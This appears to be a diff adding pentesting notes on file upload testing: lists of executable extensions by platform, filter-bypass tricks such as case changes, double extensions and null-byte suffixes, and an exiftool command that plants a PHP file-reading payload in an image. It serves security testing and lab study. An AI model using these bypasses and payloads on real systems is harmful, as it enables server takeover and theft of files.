@@ -1,1 +1,45 @@
+https://rodelllemit.medium.com/web-app-pentesting-test-cases-for-file-upload-9b5734a0a144
++++++++++++ First check Which +++++++++++++++++
+++++++++++++ files extentions +++++++++++++++++
+++++++++++++++ can it take ++++++++++++++++++++
 
+PHP: .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module
+Working in PHPv8: .php, .php4, .php5, .phtml, .module, .inc, .hphp, .ctp
+ASP: .asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml
+Jsp: .jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action
+Coldfusion: .cfm, .cfml, .cfc, .dbm
+Flash: .swf
+Perl: .pl, .cgi
+Erlang Yaws Web Server: .yaws
+
+
+####################################################
+         Bypass file extensions checks
+####################################################
+
+1) If above is not working then try these also
++++++ Try using some uppercase letters +++++
+- pHp, pHP5, PhAr, hTmL, etc...
+
+2) Try adding a valid extension before the execution extension
+- exploit.png.php or exploit.php.png( double extension)
+3) Check adding a valid extension at the end.
+- exploit.php/.jpg ( app may save this as a .php file but recognizes as .jpg)
+
+4) Try adding special characters at the end. You could use Burp to bruteforce 
+all the ascii and Unicode characters. (Note that you can also try to use the 
+previously motioned extensions)
+
+file.php%20
+file.php%0a
+file.php%00
+file.php%0d%0a
+file.php/
+file.php.\
+file.
+file.php....
+file.pHp5....
+
+5) Create a polyglot PHP/JPG file that is a normal image, but contains your PHP payload in its metadata
+
+exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" exploit.jpg -o polyglot.php
